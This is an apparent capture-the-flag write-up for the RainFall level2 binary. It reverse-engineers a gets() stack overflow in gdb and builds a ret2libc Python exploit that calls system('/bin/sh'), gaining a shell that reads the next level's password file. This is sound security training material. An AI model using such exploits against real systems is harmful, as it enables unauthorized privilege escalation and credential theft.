
# Preparations

Entering level2 home directory we see a level2 binary with sticky bit in access rights.
By objdumping the binary we see 2 functions: main and p:

	level2@RainFall:~$ objdump -D -M intel-mnemonic level2 > /tmp/dump

Why do we do objdump first? Maybe in this exercise a function exists but is not used so we need to see all the functions.

# Code writing

We start to work with gdb in Intel syntax (set disassembly-flavor intel):

	(gdb) disass main
	Dump of assembler code for function main:
	   0x0804853f <+0>:	push   ebp
	   0x08048540 <+1>:	mov    ebp,esp
	   0x08048542 <+3>:	and    esp,0xfffffff0
	   0x08048545 <+6>:	call   0x80484d4 <p>
	   0x0804854a <+11>:	leave
	   0x0804854b <+12>:	ret

The only action after prologue is a call of the p function.
So main will look like:

	int main(void)
	{
		p();
	}

Let's look in the p function:

	(gdb) disass p
	Dump of assembler code for function p:
	   0x080484d4 <+0>:	push   ebp
	   0x080484d5 <+1>:	mov    ebp,esp
	   0x080484d7 <+3>:	sub    esp,0x68
	   0x080484da <+6>:	mov    eax,ds:0x8049860			;getting ready to fflush, some FILE stream
	   0x080484df <+11>:	mov    DWORD PTR [esp],eax		;arguments for fflush
	   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>		;call fflush
	   0x080484e7 <+19>:	lea    eax,[ebp-0x4c]			;getting ready to gets
	   0x080484ea <+22>:	mov    DWORD PTR [esp],eax		;arguments for gets
	   0x080484ed <+25>:	call   0x80483c0 <gets@plt>		;call gets
	   0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]		;something new, occured to be __builtin_return_address function
	   0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax		;something new, occured to be __builtin_return_address function result put to a variable
	   0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]		;something new, occured to be __builtin_return_address function result variable that starts to be used
	   0x080484fb <+39>:	and    eax,0xb0000000			;bitwise AND operator
	   0x08048500 <+44>:	cmp    eax,0xb0000000			;comparison with 0xb0000000
	   0x08048505 <+49>:	jne    0x8048527 <p+83>			;if not equal than directly to puts function preparation
	   0x08048507 <+51>:	mov    eax,0x8048620			;getting ready to printf
	   0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]		;getting ready to printf
	   0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx		;arguments to print
	   0x08048513 <+63>:	mov    DWORD PTR [esp],eax		;arguments to print
	   0x08048516 <+66>:	call   0x80483a0 <printf@plt>		;call printf
	   0x0804851b <+71>:	mov    DWORD PTR [esp],0x1		;arguments to exit
	   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>		;call exit
	   0x08048527 <+83>:	lea    eax,[ebp-0x4c]			;preparation to puts
	   0x0804852a <+86>:	mov    DWORD PTR [esp],eax		;arguments to puts
	   0x0804852d <+89>:	call   0x80483f0 <puts@plt>		;call puts
	   0x08048532 <+94>:	lea    eax,[ebp-0x4c]			;preparation to strdup
	   0x08048535 <+97>:	mov    DWORD PTR [esp],eax		;arguments to strdup
	   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>		;call strdup
	   0x0804853d <+105>:	leave
	   0x0804853e <+106>:	ret

Let's see some insites by their addresses:

	(gdb) x/16cb 0x8049860
		0x8049860 <stdout@@GLIBC_2.0>:	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'
		0x8049868 <dtor_idx.6161>:	0 '\000'	0 '\000'	0 '\000'	0 '\000'	Cannot access memory at address 0x804986c

	Breakpoint 2, 0x080484e7 in p ()
	(gdb) i r ebp
		ebp            0xbffff6f8	0xbffff6f8
	(gdb) p/x 0xbffff6f8 - 0x4c
		$2 = 0xbffff6ac
	(gdb) x/16x 0xbffff6ac
		0xbffff6ac:	0x00000001	0xbffff8c1	0x0000002f	0xbffff70c
		0xbffff6bc:	0xb7fd0ff4	0x08048550	0x08049828	0x00000001
		0xbffff6cc:	0x08048381	0xb7fd13e4	0x00000014	0x08049828
		0xbffff6dc:	0x08048571	0xffffffff	0xb7e5edc6	0xb7fd0ff4
	(gdb) info frame
		Stack level 0, frame at 0xbffff700:
		 eip = 0x80484e7 in p; saved eip **0x804854a**
		 called by frame at 0xbffff710
		 Arglist at 0xbffff6f8, args:
		 Locals at 0xbffff6f8, Previous frame's sp is 0xbffff700
		 Saved registers:
		  ebp at 0xbffff6f8, eip at 0xbffff6fc

There is some rubbish before we put value to `$ebp - 0x4c` variable. But after:

	0x080484ed <+25>:	call   0x80483c0 <gets@plt>
	0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
	0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax

	(gdb) p $ebp + 0x4
		$1 = (void *) 0xbffff6fc
	(gdb) p/x *0xbffff6fc
		$3 = 0x804854a

That is return address from the `info frame`. In C return address can be saved with `__builtin_return_address function`.\
Now we need to find the buffer size.

	(gdb) print $ebp-0x4c
		$10 = (void *) 0xbffff6ac
	(gdb) print $ebp-0xc
		$11 = (void *) 0xbffff6ec
	(gdb) print 0xbffff6ec - 0xbffff6ac
		$15 = 64

We can overwrite buffer here. If we play a bit with buffer and check the stack with:
	
	(gdb)  x/50x 0xbffff6ac

We see that return address lies 80 bytes after the beginning of the buffer.

	(gdb) print 0xbffff6fc - 0xbffff6ac
		$16 = 80

Let's continue with examination:

	(gdb) x/20cb 0x8048620
		0x8048620:	40 '('	37 '%'	112 'p'	41 ')'	10 '\n'	0 '\000'	0 '\000'	0 '\000'

Numbers in hex are transferred to decimal with the help of programming calculator and finally we write the code in C.

# Exploitation

We can overwrite the return address and call system function with arguments. But they should be properly written to the stack.

> We’ll write the address of system to the location of the return address that we found. When ret command is executed, the stack pointer would move down to point to “return address 2”, which is where system function will expect its return address to be located (we’ll ignore it for now). The 4 bytes after that would be the first argument to system, so we need to put the address of string “/bin/sh” there.

In order to exploit this level we will need return address from the `p` function, `system` function address, `exit` function address and `/bin/sh` string address:

	1. **0x0804853e** <+106>:	ret - return address from p to main function. We should put it instead of 0x0804854a to cal system function
	2. $9 = {<text variable, no debug info>} 0xb7e6b060 <system>

	(gdb) p system
		$9 = {<text variable, no debug info>} 0xb7e6b060 <system>

	3. 0xb7f8cc58:	 "/bin/sh"

	(gdb) info proc map
		0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	(gdb) find 0xb7e2c000, +9999999, "/bin/sh"
		0xb7f8cc58
	(gdb) x/s 0xb7f8cc58
		0xb7f8cc58:	 "/bin/sh"

	4. 0xb7e5ebe0 <exit>

	(gdb) p exit
		$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>

And now let's write exploitation:

	#!/usr/bin/python
	import struct
	
	buffer = ''
	buffer += 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT' # junk 80 letters
	buffer += struct.pack('I', 0x0804853e) # address of ret in p()
	buffer += struct.pack('I', 0xb7e6b060) # system
	buffer += struct.pack('I', 0xb7e5ebe0) # exit
	buffer += struct.pack('I', 0xb7f8cc58) # "/bin/sh"
	print(buffer)

And in `gdb` its work:

	(gdb) x/3i $eip
		=> 0x80484f2 <p+30>:	mov    eax,DWORD PTR [ebp+0x4]
		0x80484f5 <p+33>:	mov    DWORD PTR [ebp-0xc],eax
		0x80484f8 <p+36>:	mov    eax,DWORD PTR [ebp-0xc]
	(gdb) x/80x $esp
		0xbffff670:	0xbffff68c	0x00000000	0x00000000	0xb7e5ec73
		0xbffff680:	0x080482b5	0x00000000	0x00c30000	0x41414141
		0xbffff690:	0x42424242	0x43434343	0x44444444	0x45454545
		0xbffff6a0:	0x46464646	0x47474747	0x48484848	0x49494949
		0xbffff6b0:	0x4a4a4a4a	0x4b4b4b4b	0x4c4c4c4c	0x4d4d4d4d
		0xbffff6c0:	0x4e4e4e4e	0x4f4f4f4f	0x50505050	0x51515151
		0xbffff6d0:	0x52525252	0x53535353	0x54545454	**0x0804853e**
		0xbffff6e0:	**0xb7e6b060**	**0xb7e5ebe0**	**0xb7f8cc58**	0xb7e45400
		0xbffff6f0:	0x00000001	0xbffff784	0xbffff78c	0xb7fdc858
		0xbffff700:	0x00000000	0xbffff71c	0xbffff78c	0x00000000
		0xbffff710:	0x08048260	0xb7fd0ff4	0x00000000	0x00000000
		0xbffff720:	0x00000000	0xfcda27ff	0xcb9ee3ef	0x00000000
		0xbffff730:	0x00000000	0x00000000	0x00000001	0x08048420
		0xbffff740:	0x00000000	0xb7ff26b0	0xb7e453e9	0xb7ffeff4
		0xbffff750:	0x00000001	0x08048420	0x00000000	0x08048441
		0xbffff760:	0x0804853f	0x00000001	0xbffff784	0x08048550
		0xbffff770:	0x080485c0	0xb7fed280	0xbffff77c	0xb7fff918
		0xbffff780:	0x00000001	0xbffff8ad	0x00000000	0xbffff8c6

When we enter `system` function:

	(gdb) x/3i $eip
		=> 0xb7e6b060 <system>:	sub    esp,0x1c
		0xb7e6b063 <system+3>:	mov    DWORD PTR [esp+0x14],esi
		0xb7e6b067 <system+7>:	mov    esi,DWORD PTR [esp+0x20]
	(gdb) x/80x $esp
		0xbffff6e4:	**0xb7e5ebe0**	**0xb7f8cc58**	0xb7e45400	0x00000001
		0xbffff6f4:	0xbffff784	0xbffff78c	0xb7fdc858	0x00000000
		0xbffff704:	0xbffff71c	0xbffff78c	0x00000000	0x08048260
		0xbffff714:	0xb7fd0ff4	0x00000000	0x00000000	0x00000000
	Breakpoint 12, 0xb7e6b060 in system () from /lib/i386-linux-gnu/libc.so.6
		Stack level 0, frame at 0xbffff6e8:
		 eip = 0xb7e6b060 in system; saved eip **0xb7e5ebe0**
		 called by frame at 0x5454545c
		 Arglist at 0xbffff6e0, args:
		 Locals at 0xbffff6e0, Previous frame's sp is 0xbffff6e8
		 Saved registers:
		  eip at 0xbffff6e4

Main description is here: https://airman604.medium.com/protostar-stack7-walkthrough-2aa2428be3e0

# Result

	level2@RainFall:~$ vi /tmp/exploit.py
	level2@RainFall:~$ python /tmp/exploit.py > /tmp/2exp
	
	level2@RainFall:~$ cat /tmp/2exp -| ./level2
	AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP>RRRRSSSSTTTT>`�����X��
	whoami
	level3
	cat /home/user/level3/.pass
	492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

Why do we use `cat -` command? Because even if we break the level and call shell, binary is "limited" and can not give us terminal. For that reason we use option of `cat` that helps us to use stdin where shell is called after exploitation.